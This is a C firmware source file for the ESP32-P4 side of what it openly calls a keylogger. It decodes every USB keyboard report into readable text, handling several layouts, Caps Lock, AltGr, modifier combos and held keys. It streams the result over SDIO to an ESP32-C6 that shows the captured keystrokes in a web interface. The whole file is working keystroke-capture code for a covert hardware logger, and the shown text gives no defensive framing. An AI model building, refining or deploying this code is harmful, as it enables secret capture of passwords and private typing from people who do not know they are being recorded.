// P4-side transport to the C6 keylogger web UI — over SDIO on the already-
// wired M-EXT bus. Public API (c6_uart_*) is unchanged so callers stay the
// same; the underlying wire is different.
//
// Wiring (P4 host  <->  C6 slave on ESP32-P4-MINI-B-M-EXT):
//     GPIO18  CLK   ->  GPIO19
//     GPIO19  CMD   ->  GPIO18
//     GPIO14  D0    ->  GPIO20
//     GPIO15  D1    ->  GPIO21
//     GPIO16  D2    ->  GPIO22
//     GPIO17  D3    ->  GPIO23
//     GPIO54  RESET ->  EN
// These are the same lines ESP-Hosted uses when the stock firmware is on the C6.

#include "c6_uart.h"
#include "kb_layouts.h"
#include "led.h"
#include "hid_bridge.h"     // hid_host_kbd_leds() for Caps Lock in the log

#include <string.h>
#include <stdio.h>
#include <limits.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_heap_caps.h"
#include "driver/gpio.h"
#include "driver/sdmmc_host.h"
#include "sdmmc_cmd.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#define C6_RESET_PIN 54

// After this many consecutive failed SDIO register reads (~6 s at the 500 ms
// poll rate), the link to the C6 is considered dead and the P4 tears down and
// re-probes it (see recover_sdio_link). This is what makes a C6 reboot
// self-heal: before, a reset wedged the host side and the LED stayed frozen
// at its last byte forever.
#define RECOVER_AFTER_FAILS 12

// The ESP32 sdio_slave receive path — the CMD53 write address must be
// (0x1F800 - length) mod 0x20000. That’s the FIFO tail address convention
// the ESP32 slave IP uses; sdio_slave_recv() gives us whatever bytes the
// master pushes here.
#define SDIO_SLAVE_WRITE_ADDR_END  0x1F800

static const char *TAG = "c6sdio";
static bool s_ready;
static SemaphoreHandle_t s_lock;
static sdmmc_card_t     *s_card;
static uint8_t s_prev_keys[6];
static uint8_t s_prev_mod = 0;
static bool     s_kbd_seen_connected;
static bool     s_kbd_interface_present;
static uint32_t s_kbd_iface_up_ms;         // ms tick when interface enumerated
static bool     s_mouse_seen_connected;
static bool     s_mouse_interface_present;

// --- combo + hold-key tracking ---
// The C6 web UI groups modifier + regular keys as "[LALT + 6 + h]" and reports
// long solo presses as "[HELD KEY: J, 5 Seconds]". Rules from the user:
//   * Modifier held while other keys pressed -> emit one combo on release
//   * Solo key held > HOLD_MS -> emit HELD event on release (no HELD if in combo)
#define HOLD_MS 1500

// SHIFT (bits 1 / 5) is inherently part of typing; we do NOT let it enter
// combo capture. Only CTRL / ALT / GUI trigger combos.
#define COMBO_MOD_MASK 0xDDu     // ~(SHIFT_L | SHIFT_R) = 0xDD

typedef struct { uint8_t kc; uint32_t t_press_ms; } key_ts_t;
static key_ts_t s_pressed[6];         // parallel to s_prev_keys
static uint8_t  s_combo_mods_ever;    // union of mods that were down during combo
static char     s_combo_buf[128];     // accumulated combo body ("6 + h + J")
static int      s_combo_len;
static bool     s_combo_active;

static uint32_t now_ms(void) { return xTaskGetTickCount() * portTICK_PERIOD_MS; }

// Forward decl — tx_line's body sits below the combo helpers.
static void tx_line(const char *prefix, const char *body);
// Forward decl — led_poll_task's body sits below link_bringup_task.
static void led_poll_task(void *arg);
// The C6 exposes its "current LED mode" byte via SDIO scratch register at
// CCCR position 0x60 + 40. Poll every 500 ms — cheap CMD52, negligible
// SDIO bandwidth — and apply changes locally on the P4.

static void reset_c6(void) {
    gpio_reset_pin(C6_RESET_PIN);
    gpio_set_direction(C6_RESET_PIN, GPIO_MODE_OUTPUT);
    gpio_set_level(C6_RESET_PIN, 0);
    vTaskDelay(pdMS_TO_TICKS(80));
    gpio_set_level(C6_RESET_PIN, 1);
    vTaskDelay(pdMS_TO_TICKS(2500));    // give C6 time to boot into keylogger fw
}

static esp_err_t sdio_link_bring_up(void) {
    ESP_LOGI(TAG, "[1/6] reset C6 via GPIO%d", C6_RESET_PIN);
    reset_c6();

    sdmmc_host_t host = SDMMC_HOST_DEFAULT();
    host.slot = SDMMC_HOST_SLOT_1;
    // ALLOC_ALIGNED_BUF: let the driver copy our small packets into an internal
    // cache-aligned DMA buffer. Without it, unaligned buffers trip INVALID_ARG.
    host.flags = SDMMC_HOST_FLAG_4BIT | SDMMC_HOST_FLAG_ALLOC_ALIGNED_BUF;
    host.max_freq_khz = SDMMC_FREQ_DEFAULT;
    sdmmc_slot_config_t slot = SDMMC_SLOT_CONFIG_DEFAULT();
    slot.clk = 18; slot.cmd = 19;
    slot.d0 = 14;  slot.d1 = 15; slot.d2 = 16; slot.d3 = 17;
    slot.width = 4;
    slot.flags = SDMMC_SLOT_FLAG_INTERNAL_PULLUP;

    ESP_LOGI(TAG, "[2/6] sdmmc_host_init");
    esp_err_t err = sdmmc_host_init();
    if (err != ESP_OK) { ESP_LOGE(TAG, "sdmmc_host_init: %s", esp_err_to_name(err)); return err; }

    ESP_LOGI(TAG, "[3/6] sdmmc_host_init_slot SLOT_%d CLK=%d CMD=%d D0-3=%d/%d/%d/%d w=%d",
             host.slot, slot.clk, slot.cmd, slot.d0, slot.d1, slot.d2, slot.d3, slot.width);
    err = sdmmc_host_init_slot(host.slot, &slot);
    if (err != ESP_OK) { ESP_LOGE(TAG, "sdmmc_host_init_slot: %s", esp_err_to_name(err)); return err; }

    s_card = calloc(1, sizeof(sdmmc_card_t));
    if (!s_card) return ESP_ERR_NO_MEM;

    ESP_LOGI(TAG, "[4/6] sdmmc_card_init (probe C6 slave)");
    err = sdmmc_card_init(&host, s_card);
    if (err != ESP_OK) { ESP_LOGE(TAG, "sdmmc_card_init: %s", esp_err_to_name(err)); return err; }
    ESP_LOGI(TAG, "    card OK: is_sdio=%d n_io_funcs=%d rca=0x%04x",
             s_card->is_sdio, s_card->num_io_functions, s_card->rca);

    ESP_LOGI(TAG, "[5/6] enable Function 1 (SDIO slave data path)");
    // CCCR IOEx bit1 = enable Function 1
    uint8_t ioe = 0;
    err = sdmmc_io_read_byte (s_card, 0, 0x02, &ioe);        // SD_IO_CCCR_FN_ENABLE
    if (err != ESP_OK) { ESP_LOGE(TAG, "read IOE: %s", esp_err_to_name(err)); return err; }
    ioe |= 0x02;
    err = sdmmc_io_write_byte(s_card, 0, 0x02, ioe, &ioe);
    if (err != ESP_OK) { ESP_LOGE(TAG, "write IOE: %s", esp_err_to_name(err)); return err; }
    ESP_LOGI(TAG, "    IOE = 0x%02x", ioe);

    // wait for IOR bit1 to become 1
    for (int i = 0; i < 20; i++) {
        uint8_t ior = 0;
        sdmmc_io_read_byte(s_card, 0, 0x03, &ior);           // SD_IO_CCCR_FN_READY
        if (ior & 0x02) { ESP_LOGI(TAG, "    IOR = 0x%02x (Function 1 ready)", ior); break; }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    ESP_LOGI(TAG, "[6/6] set Function 1 block size = 512");
    // CCCR block-size regs for Function 1 are at 0x110-0x111
    err = sdmmc_io_write_byte(s_card, 0, 0x110, 0x00, NULL);
    if (err == ESP_OK) err = sdmmc_io_write_byte(s_card, 0, 0x111, 0x02, NULL);
    if (err != ESP_OK) ESP_LOGW(TAG, "set block size: %s", esp_err_to_name(err));

    ESP_LOGI(TAG, "SDIO link to C6 up (raw CMD52/53 mode)");
    return ESP_OK;
}

// Send a single line (short packet) to the C6 slave via CMD53 byte-mode write.
// The slave's sdio_slave_recv() will deliver the padded packet to us.
static esp_err_t sdio_raw_send(const uint8_t *buf, size_t len) {
    if (!s_card) return ESP_ERR_INVALID_STATE;
    // Byte-mode CMD53 requires the write length to be a multiple of 4.
    size_t padded = (len + 3) & ~3u;
    if (padded > 512) padded = 512;
    // Extra bytes past 'len' in our DMA buffer are zeroes (we zero on prep),
    // so no garbage leaks into the slave.
    return sdmmc_io_write_bytes(s_card, 1,
        SDIO_SLAVE_WRITE_ADDR_END - padded, (void *)buf, padded);
}

static bool keycode_was_pressed(uint8_t kc) {
    for (int i = 0; i < 6; i++) if (s_prev_keys[i] == kc) return true;
    return false;
}

// US QWERTY layout, HID Usage Table page 0x07.
// Covers the full 0x04..0x67 range that a boot-report keyboard sends.
static const char kb_unshifted[128] = {
    // 0x04..0x1d: a..z
    [0x04]='a',[0x05]='b',[0x06]='c',[0x07]='d',[0x08]='e',[0x09]='f',
    [0x0a]='g',[0x0b]='h',[0x0c]='i',[0x0d]='j',[0x0e]='k',[0x0f]='l',
    [0x10]='m',[0x11]='n',[0x12]='o',[0x13]='p',[0x14]='q',[0x15]='r',
    [0x16]='s',[0x17]='t',[0x18]='u',[0x19]='v',[0x1a]='w',[0x1b]='x',
    [0x1c]='y',[0x1d]='z',
    // 0x1e..0x27: 1..0
    [0x1e]='1',[0x1f]='2',[0x20]='3',[0x21]='4',[0x22]='5',[0x23]='6',
    [0x24]='7',[0x25]='8',[0x26]='9',[0x27]='0',
    // 0x2c..0x38: punctuation (SPACE 0x2c intentionally omitted so it
    // renders as "[SPACE]" via kb_special even in combo capture).
    [0x2d]='-',[0x2e]='=',[0x2f]='[',[0x30]=']',[0x31]='\\',
    [0x33]=';',[0x34]='\'',[0x35]='`',[0x36]=',',[0x37]='.',[0x38]='/',
    // 0x54..0x63: keypad printable (assumes NumLock ON)
    [0x54]='/',[0x55]='*',[0x56]='-',[0x57]='+',
    [0x59]='1',[0x5a]='2',[0x5b]='3',[0x5c]='4',[0x5d]='5',
    [0x5e]='6',[0x5f]='7',[0x60]='8',[0x61]='9',[0x62]='0',[0x63]='.',
    // 0x64: non-US backslash
    [0x64]='\\',
    // 0x67: keypad = (rare, on Mac keyboards)
    [0x67]='=',
};
static const char kb_shifted[128] = {
    [0x04]='A',[0x05]='B',[0x06]='C',[0x07]='D',[0x08]='E',[0x09]='F',
    [0x0a]='G',[0x0b]='H',[0x0c]='I',[0x0d]='J',[0x0e]='K',[0x0f]='L',
    [0x10]='M',[0x11]='N',[0x12]='O',[0x13]='P',[0x14]='Q',[0x15]='R',
    [0x16]='S',[0x17]='T',[0x18]='U',[0x19]='V',[0x1a]='W',[0x1b]='X',
    [0x1c]='Y',[0x1d]='Z',
    [0x1e]='!',[0x1f]='@',[0x20]='#',[0x21]='$',[0x22]='%',[0x23]='^',
    [0x24]='&',[0x25]='*',[0x26]='(',[0x27]=')',
    [0x2d]='_',[0x2e]='+',[0x2f]='{',[0x30]='}',[0x31]='|',
    [0x33]=':',[0x34]='"',[0x35]='~',[0x36]='<',[0x37]='>',[0x38]='?',
    // Keypad ignores shift on Windows — mirror unshifted so we don't lie
    [0x54]='/',[0x55]='*',[0x56]='-',[0x57]='+',
    [0x59]='1',[0x5a]='2',[0x5b]='3',[0x5c]='4',[0x5d]='5',
    [0x5e]='6',[0x5f]='7',[0x60]='8',[0x61]='9',[0x62]='0',[0x63]='.',
    [0x64]='|',
    [0x67]='=',
};

// Non-printable keys are rendered as [NAME] in the log.
static const char *kb_special(uint8_t kc) {
    switch (kc) {
    case 0x28: return "\n";           // Enter -> real newline
    case 0x29: return "[ESC]";
    case 0x2a: return "[BACKSPACE]";
    case 0x2b: return "[TAB]";
    case 0x2c: return "[SPACE]";      // render space as a named token, not a literal ' '
    case 0x39: return "[CAPS]";
    case 0x3a: return "[F1]";  case 0x3b: return "[F2]";  case 0x3c: return "[F3]";
    case 0x3d: return "[F4]";  case 0x3e: return "[F5]";  case 0x3f: return "[F6]";
    case 0x40: return "[F7]";  case 0x41: return "[F8]";  case 0x42: return "[F9]";
    case 0x43: return "[F10]"; case 0x44: return "[F11]"; case 0x45: return "[F12]";
    case 0x46: return "[PRTSC]";
    case 0x47: return "[SCROLL]";
    case 0x48: return "[PAUSE]";
    case 0x49: return "[INS]";
    case 0x4a: return "[HOME]";
    case 0x4b: return "[PGUP]";
    case 0x4c: return "[DEL]";
    case 0x4d: return "[END]";
    case 0x4e: return "[PGDN]";
    case 0x4f: return "[RIGHT]";
    case 0x50: return "[LEFT]";
    case 0x51: return "[DOWN]";
    case 0x52: return "[UP]";
    case 0x53: return "[NUMLOCK]";
    case 0x58: return "\n";           // Keypad Enter -> real newline
    case 0x65: return "[MENU]";       // right-click / application key
    case 0x66: return "[POWER]";
    // Language / editing keys (rare, but let's cover them)
    case 0x68: return "[F13]"; case 0x69: return "[F14]"; case 0x6a: return "[F15]";
    case 0x6b: return "[F16]"; case 0x6c: return "[F17]"; case 0x6d: return "[F18]";
    case 0x6e: return "[F19]"; case 0x6f: return "[F20]"; case 0x70: return "[F21]";
    case 0x71: return "[F22]"; case 0x72: return "[F23]"; case 0x73: return "[F24]";
    case 0x79: return "[AGAIN]";  case 0x7a: return "[UNDO]";
    case 0x7b: return "[CUT]";    case 0x7c: return "[COPY]"; case 0x7d: return "[PASTE]";
    case 0x7e: return "[FIND]";
    case 0x7f: return "[MUTE]";   case 0x80: return "[VOL+]"; case 0x81: return "[VOL-]";
    default:   return NULL;
    }
}

// Modifier byte bit -> label used inside a combo ("LCTRL", "LALT", ...)
static const char *mod_label[8] = {
    "LCTRL", "LSHIFT", "LALT", "WINDOWS",
    "RCTRL", "RSHIFT", "RALT", "RWINDOWS",
};

// Render one kc -> string. For printable this is the char; for special this is
// the label without brackets (so we can nest inside "[LALT + F4]"). We check
// the current keyboard layout first so a German keyboard's y/z, ä/ö/ü/ß etc.
// come out right.
static void render_special(uint8_t kc, char *out, size_t out_sz) {
    const char *name = kb_special(kc);
    if (name) {
        if (name[0] == '\n' && name[1] == 0) { snprintf(out, out_sz, "ENTER"); return; }
        // strip surrounding brackets from kb_special output for cleaner combos
        size_t nl = strlen(name);
        if (nl >= 2 && name[0] == '[' && name[nl-1] == ']') {
            size_t inner = nl - 2 < out_sz - 1 ? nl - 2 : out_sz - 1;
            memcpy(out, name + 1, inner); out[inner] = 0;
        } else {
            snprintf(out, out_sz, "%s", name);
        }
        return;
    }
    snprintf(out, out_sz, "0x%02X", kc);
}

static void render_key(uint8_t kc, bool shift, bool altgr, char *out, size_t out_sz) {
    if (!out_sz) return;
    const kb_layout_entry_t *layo = kb_layout_lookup(kb_layout_get(), kc);
    if (layo) {
        const char *s = altgr ? layo->altgr
                              : (shift ? layo->shifted : layo->unshifted);
        if (s && *s) { snprintf(out, out_sz, "%s", s); return; }
    }
    if (kc >= 0x04 && kc < 0x68) {
        // In the ASCII table range: use the table, fall back to specials only
        // when the table has no entry for this code.
        char c = shift ? kb_shifted[kc] : kb_unshifted[kc];
        if (c && c != '\n') { out[0] = c; out[1] = 0; return; }
    }
    // Out-of-table usage codes (0x68..0x81 media keys, reserved) must never
    // index the 128-entry table; route them straight through the specials.
    render_special(kc, out, out_sz);
}

static void combo_reset(void) { s_combo_len = 0; s_combo_buf[0] = 0; s_combo_mods_ever = 0; s_combo_active = false; }

static void combo_append(const char *token) {
    int need = (s_combo_len ? 3 : 0) + (int)strlen(token);
    if (s_combo_len + need >= (int)sizeof(s_combo_buf) - 1) return;
    if (s_combo_len) { memcpy(s_combo_buf + s_combo_len, " + ", 3); s_combo_len += 3; }
    int tl = (int)strlen(token);
    memcpy(s_combo_buf + s_combo_len, token, tl);
    s_combo_len += tl;
    s_combo_buf[s_combo_len] = 0;
}

// Flush the current combo to the C6. Called when the last modifier goes up.
// If no keys were pressed while modifier was held, this emits "[MOD]" so lone
// modifier presses are still logged (matches "Hello! [WINDOWS]" example).
static void combo_flush(void) {
    if (!s_combo_active && !s_combo_mods_ever) return;
    char out[192];
    size_t cap = sizeof(out);
    size_t off = 0;
    // snprintf returns the value that WOULD have been written, so adding it
    // blindly can push past the buffer even though each call was bounded.
    // Track the offset as a size_t and clamp it so later calls can never
    // underflow (off > cap -> cap - off huge -> unbounded write).
    off += (size_t)snprintf(out + off, cap - off, "[");
    if (off >= cap) off = cap - 1;
    bool first = true;
    for (int i = 0; i < 8 && off < cap; i++) {
        if (s_combo_mods_ever & (1u << i)) {
            int w = snprintf(out + off, cap - off, "%s%s", first ? "" : " + ", mod_label[i]);
            if (w > 0) off += (size_t)w;
            if (off >= cap) off = cap - 1;
            first = false;
        }
    }
    if (s_combo_len && off < cap) {
        int w = snprintf(out + off, cap - off, "%s%s", first ? "" : " + ", s_combo_buf);
        if (w > 0) off += (size_t)w;
        if (off >= cap) off = cap - 1;
    }
    if (off < cap) snprintf(out + off, cap - off, "]");   // clipped "]" is acceptable, buffer stays valid
    tx_line("KEY", out);
    combo_reset();
}

// Reusable DMA-capable buffer, avoids per-line heap_caps_malloc thrash.
static uint8_t *s_tx_dma;
#define TX_DMA_SZ 256

static void tx_line(const char *prefix, const char *body) {
    if (!s_ready) return;
    xSemaphoreTake(s_lock, portMAX_DELAY);
    memset(s_tx_dma, 0, TX_DMA_SZ);
    int n;
    // KEY frames whose body is a bracketed label ("[LALT + 6]", "[F4]",
    // "[HELD KEY: J, 2 Seconds]") get a trailing space so subsequent typed
    // text doesn't concatenate visually: "[LCTRL + a + x] s" instead of
    // "[LCTRL + a + x]s". Non-bracket KEYs (single characters) stay tight.
    // Exception: "[SPACE]" is a Space keystroke — consecutive presses must
    // render as "[SPACE][SPACE][SPACE]" without gaps, so treat it like a
    // printable character (no trailing separator).
    bool is_space = body && body[0] == '[' && body[1] == 'S' && body[2] == 'P';
    bool wants_sep = body && body[0] == '['
                     && !is_space
                     && !strcmp(prefix, "KEY");
    if (body && *body) {
        n = snprintf((char*)s_tx_dma, TX_DMA_SZ,
                     wants_sep ? "%s %s \n" : "%s %s\n", prefix, body);
    } else {
        n = snprintf((char*)s_tx_dma, TX_DMA_SZ, "%s\n", prefix);
    }
    if (n > 0 && n < TX_DMA_SZ) {
        esp_err_t err = sdio_raw_send(s_tx_dma, (size_t)n);
        if (err != ESP_OK) ESP_LOGW(TAG, "sdio_raw_send(%d): %s", n, esp_err_to_name(err));
    }
    xSemaphoreGive(s_lock);
}

// No periodic heartbeat: the browser polls /status every 3 s so it always has
// current pill state, and every real connect/disconnect edge still emits an
// EVT frame at the moment it happens. Re-announcing on a timer just spammed
// the log with duplicate KBD_CONNECT / MOUSE_CONNECT lines.

// Called after s_ready flips true. Re-emits every "we are currently in state
// X" EVT whose original edge may have fired BEFORE the SDIO link was up (and
// been silently dropped by tx_line). Without this, a keyboard/mouse plugged
// in at cold boot never gets a KBD_CONNECT / MOUSE_CONNECT on the wire and
// the C6 web UI's pill sits permanently at "not attached".
static void reannounce_state(void) {
    tx_line("EVT", "P4_READY");
    if (led_init_status() == ESP_OK) {
        tx_line("EVT", "P4_LED_OK");
    } else {
        char body[48];
        snprintf(body, sizeof(body), "P4_LED_FAIL %s", esp_err_to_name(led_init_status()));
        tx_line("EVT", body);
    }
    if (s_kbd_seen_connected)   tx_line("EVT", "KBD_CONNECT");
    if (s_mouse_seen_connected) tx_line("EVT", "MOUSE_CONNECT");
}

static void link_bringup_task(void *arg) {
    (void)arg;
    // Retry forever on failure. A first-boot SDIO glitch used to permanently
    // disable the P4->C6 link (task deleted itself and nothing else could
    // recover it, because led_poll_task — which owns recover_sdio_link — is
    // only spawned after the FIRST successful bring-up).
    int backoff_ms = 500;
    while (sdio_link_bring_up() != ESP_OK) {
        ESP_LOGE(TAG, "SDIO link failed — retrying in %d ms", backoff_ms);
        // Clean partial state left by the failed probe so the next attempt
        // starts from a known-empty host.
        if (s_card) { free(s_card); s_card = NULL; }
        (void)sdmmc_host_deinit();
        vTaskDelay(pdMS_TO_TICKS(backoff_ms));
        if (backoff_ms < 5000) backoff_ms *= 2;
    }
    s_ready = true;
    reannounce_state();
    // Now that SDIO is up, spin up the reverse-channel poller so the C6
    // web UI's LED mode changes reach us.
    xTaskCreate(led_poll_task, "led_poll", 3072, NULL, 2, NULL);
    vTaskDelete(NULL);
}

// On the ESP32-C6 SDIO slave, `sdio_slave_write_reg(pos, val)` writes into
// the SLCHOST_CONF_W scratch region on FUNCTION 1. The slave HAL translates
// pos into a byte offset from conf_w0 as
//     offset = pos + (pos > 23 ? 4 : 0) + (pos > 31 ? 12 : 0)
// (see hal/esp32c6 sdio_slave_ll_host_get_w_reg). conf_w0 itself lives at
// SLCHOST offset 0x6C, so the master (P4) reads via CMD52 on FUNCTION 1
// at raw address (0x6C + offset) masked to 10 bits.
// For pos=40 (LED):    offset = 40 + 4 + 12 = 56 → raw addr = 0x6C + 56 = 0xA4
// For pos=41 (layout): offset = 41 + 4 + 12 = 57 → raw addr = 0x6C + 57 = 0xA5
// The earlier addresses (0x60+pos on Function 0, later 0xA8/0xA9 on
// Function 1) were reading nearby but WRONG bytes, so every LED and layout
// write from the C6 web UI silently missed — the LED stayed KEY_FLASH and
// the layout stayed at whatever the P4 read on cold boot.
#define C6_REG_LED_MODE_ADDR   0xA4   // slave scratch reg 40 → Function 1 @ 0xA4
#define C6_REG_LAYOUT_ADDR     0xA5   // slave scratch reg 41 → Function 1 @ 0xA5 (0=US 1=DE 2=UK)

// The host side of the SDIO link died (typically because the C6 was reset or
// its wifi crash forced a reboot — the slave re-enumerates with a fresh RCA
// that our cached card context no longer matches). Tear the card context and
// the sdmmc host driver down and re-run the full bring-up, including a fresh
// C6 reset so the C6 re-asserts its boot telemetry on reg 40.
static bool recover_sdio_link(void) {
    ESP_LOGW(TAG, "C6 link lost (reads failing) — resetting C6 + re-probing SDIO");
    if (s_card) { free(s_card); s_card = NULL; }
    // Host already down (or never fully up) is fine — deinit is best-effort.
    esp_err_t err = sdmmc_host_deinit();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_LOGE(TAG, "host deinit: %s", esp_err_to_name(err));
    }
    if (sdio_link_bring_up() != ESP_OK) {
        ESP_LOGE(TAG, "re-probe failed — will retry later");
        return false;
    }
    s_ready = true;
    // Same re-announce logic as first-boot: after a C6 reboot the slave's
    // state is fresh, so we must repaint every "currently attached" pill.
    reannounce_state();
    ESP_LOGI(TAG, "SDIO link recovered");
    return true;
}

// Definition follows below — link_bringup_task references it.
static void led_poll_task(void *arg) {
    (void)arg;
    if (!s_card) { vTaskDelete(NULL); return; }
    // Start last_led at 0 (LED_MODE_OFF) — matches the value the poller
    // sees before any real telemetry so no spurious first-edge fires. The
    // C6's led_task now seeds s_led_disp from the persisted OFF-switch
    // state BEFORE its first tick, so by the time the P4's SDIO probe
    // completes (~3 s after C6 reset), reg 40 already carries the user's
    // intended byte — including an intentional 0 for OFF. No seen_nonzero
    // gate needed: if the user saved OFF, we honour it immediately at boot.
    uint8_t last_led = 0;
    uint8_t last_lay = 0xFF;
    int read_fails = 0;
    TickType_t last_recover = 0;
    while (1) {
        uint8_t v = 0;
        // Function 1 (SLCHOST scratch space), NOT Function 0 (CCCR).
        esp_err_t err = sdmmc_io_read_byte(s_card, 1, C6_REG_LED_MODE_ADDR, &v);
        if (err == ESP_OK) {
            read_fails = 0;
            if (v != last_led) {
                // C6 IDs: 0=OFF 1=GREEN 2=KEYFLASH 3=RED 4=BLUE
                led_set_mode((led_mode_t)(v > 4 ? LED_MODE_KEY_FLASH : v));
                last_led = v;
            }
        } else if (read_fails < INT_MAX) {
            read_fails++;
        }

        // Heal a dead/wedged link automatically (a missing C6 reboot would
        // otherwise freeze the LED on its last byte forever). Rate-limited so
        // a hard-dead C6 doesn't reset it on a hot loop.
        if (read_fails >= RECOVER_AFTER_FAILS &&
            (int)(xTaskGetTickCount() - last_recover) >= (int)pdMS_TO_TICKS(15000)) {
            last_recover = xTaskGetTickCount();
            read_fails = 0;
            if (recover_sdio_link()) {
                // After a C6 reset the slave's scratch is fresh — force a
                // re-apply on the next successful read by breaking the equality.
                last_led = 0xFF;
                last_lay = 0xFF;
            }
        }

        // Runtime layout switch straight from the web UI — no reflash.
        // Same Function-1 space as the LED reg.
        uint8_t lay = 0xFF;
        err = sdmmc_io_read_byte(s_card, 1, C6_REG_LAYOUT_ADDR, &lay);
        if (err == ESP_OK && lay != last_lay && lay < KL_COUNT) {
            kb_layout_set((kb_layout_t)lay);
            ESP_LOGI(TAG, "layout set to %s", kb_layout_name((kb_layout_t)lay));
            last_lay = lay;
        }
        vTaskDelay(pdMS_TO_TICKS(500));
    }
}

void c6_uart_init(void) {
    if (s_lock) return;
    s_lock  = xSemaphoreCreateMutex();
    s_tx_dma = heap_caps_malloc(TX_DMA_SZ, MALLOC_CAP_DMA);
    if (!s_lock || !s_tx_dma) return;

    // Non-blocking: SDIO bring-up runs in a task so app_main can continue and
    // TinyUSB HID comes up even if the SDIO link is dead.
    xTaskCreate(link_bringup_task, "c6sdio_up", 4096, NULL, 4, NULL);
}

void c6_uart_feed_kbd_report(const uint8_t *buf, size_t len) {
    if (!s_ready || !buf || len < 8) return;

    // Announce KBD_CONNECT on either (a) the first report with real data
    // (fastest signal that this is a real keyboard) or (b) 300 ms after the
    // interface enumerated, whichever comes first. This gets the pill green
    // fast (~one HID poll cycle) for real keyboards while still filtering
    // composite mice that only enumerate a phantom kbd but never send any
    // report at all.
    if (s_kbd_interface_present && !s_kbd_seen_connected) {
        bool has_data = buf[0] != 0;
        for (int i = 0; !has_data && i < 6; i++) if (buf[2 + i] > 1) has_data = true;
        uint32_t age = now_ms() - s_kbd_iface_up_ms;
        if (has_data || age >= 300) {
            s_kbd_seen_connected = true;
            tx_line("EVT", "KBD_CONNECT");
        }
    }

    uint8_t mod  = buf[0];
    const uint8_t *keys = &buf[2];
    uint32_t now  = now_ms();
    bool shift    = (mod & 0x22) != 0;
    // Caps Lock (LED bit1) XORs the shift state — but ONLY for letters.
    // Windows sends the LED bitmap back via SET_REPORT on every toggle;
    // hid_host_kbd_leds() reflects the cached value. Non-letter keys keep
    // their normal shift behaviour so "shift+1" still renders '!'.
    bool caps     = (hid_host_kbd_leds() & 0x02) != 0;
    // AltGr on DE == RALT, or the rare LCTRL+LALT combo. When active, the key
    // is a printable AltGr composition (render_key uses the altgr glyph), so it
    // must NOT be swallowed into a combo like [RALT + e].
    bool altgr = ((mod & 0x40) != 0) && (kb_layout_get() == KL_DE);
    // On DE, RALT is AltGr (glyph composition), never a combo modifier, so it
    // stays out of combo capture. LCTRL+LALT is left as a normal combo so
    // Ctrl+Alt+Del still logs correctly.
    uint8_t altgr_mask = COMBO_MOD_MASK;
    if (altgr) altgr_mask &= (uint8_t)~0x40u;

    // A "combo modifier" excludes shift so plain shift-typing doesn't get
    // swallowed into a giant combo.
    uint8_t combo_mod_now  = mod        & altgr_mask;
    uint8_t combo_mod_prev = s_prev_mod & altgr_mask;
    bool any_mod_now  = combo_mod_now  != 0;
    bool any_mod_prev = combo_mod_prev != 0;

    if (any_mod_now) {
        s_combo_active   = true;
        s_combo_mods_ever |= combo_mod_now;   // remember every mod that was down during the combo
    }

    // ---- key press edges ----
    for (int i = 0; i < 6; i++) {
        uint8_t kc = keys[i];
        if (kc == 0 || kc == 1) continue;
        if (keycode_was_pressed(kc)) continue;    // still held from prev report

        char tok[24];
        // Caps Lock inverts shift for LETTERS only (HID 0x04..0x1d); punctuation
        // and number-row keys keep their normal shift semantics.
        bool letter = (kc >= 0x04 && kc <= 0x1d);
        bool eff_shift = (caps && letter) ? !shift : shift;
        render_key(kc, eff_shift, altgr, tok, sizeof(tok));

        if (any_mod_now) {
            combo_append(tok);
        } else {
            const char *name = kb_special(kc);
            if (name && name[0] == '\n' && name[1] == 0) {
                tx_line("KEY", "\\n");
            } else if (name) {
                // Named non-printable key -> [ESC], [F4] etc.
                char body[32];
                if (name[0] == '[') tx_line("KEY", name);
                else { snprintf(body, sizeof(body), "[%s]", name); tx_line("KEY", body); }
            } else {
                // Printable (may be multi-byte UTF-8 for umlauts etc.) -> emit as-is.
                tx_line("KEY", tok);
            }
        }
        // Record press-time (also mark this slot as tracked so release can find it)
        for (int j = 0; j < 6; j++) {
            if (s_pressed[j].kc == 0) { s_pressed[j].kc = kc; s_pressed[j].t_press_ms = now; break; }
        }
    }

    // ---- key release edges ----
    for (int i = 0; i < 6; i++) {
        uint8_t kc = s_prev_keys[i];
        if (kc == 0 || kc == 1) continue;
        // still pressed?
        bool still = false;
        for (int j = 0; j < 6; j++) if (keys[j] == kc) { still = true; break; }
        if (still) continue;

        // find the press time entry
        for (int j = 0; j < 6; j++) {
            if (s_pressed[j].kc != kc) continue;
            // t_press_ms == 0 means the press-time entry was already cleared
            // by a combo flush (key stayed physically held across mod-up).
            // Recomputing "now - 0" would emit a bogus HELD with a nonsense
            // duration, so only report HELD when a real press time exists.
            if (!s_pressed[j].t_press_ms) { s_pressed[j].kc = 0; break; }
            uint32_t dur = now - s_pressed[j].t_press_ms;
            s_pressed[j].kc = 0;
            // Only report HELD for solo (no-modifier) press >= HOLD_MS.
            if (!any_mod_now && !any_mod_prev && !s_combo_active && dur >= HOLD_MS) {
                bool held_letter = (kc >= 0x04 && kc <= 0x1d);
                bool held_shift = (caps && held_letter) ? !shift : shift;
                char tok[24]; render_key(kc, held_shift, altgr, tok, sizeof(tok));
                char body[64];
                // Format the duration: whole seconds drop the ".0", and
                // "1 Second" is singular. Everything else is "N.T Seconds".
                unsigned whole = (unsigned)(dur / 1000);
                unsigned tenth = (unsigned)((dur % 1000) / 100);
                const char *unit = (whole == 1 && tenth == 0) ? "Second" : "Seconds";
                if (tenth == 0) {
                    snprintf(body, sizeof(body), "[HELD KEY: %s, %u %s]",
                             tok, whole, unit);
                } else {
                    snprintf(body, sizeof(body), "[HELD KEY: %s, %u.%u Seconds]",
                             tok, whole, tenth);
                }
                tx_line("KEY", body);
            }
            break;
        }
    }

    // ---- modifier state transitions ----
    // When ALL modifiers just released (any -> none), flush the combo.
    if (!any_mod_now && any_mod_prev) {
        combo_flush();
        // Also clear any recorded press times so releasing keys after mod-up
        // doesn't trigger spurious HELD messages.
        memset(s_pressed, 0, sizeof(s_pressed));
    }

    s_prev_mod = mod;
    memcpy(s_prev_keys, keys, 6);
}

// Composite HID keyboards commonly expose a boot-mouse interface even when
// there is no physical mouse — enumerating it fired MOUSE_CONNECT unconditionally
// before, so the pill was always green. Now we only mark the mouse "connected"
// after the first real mouse report arrives.
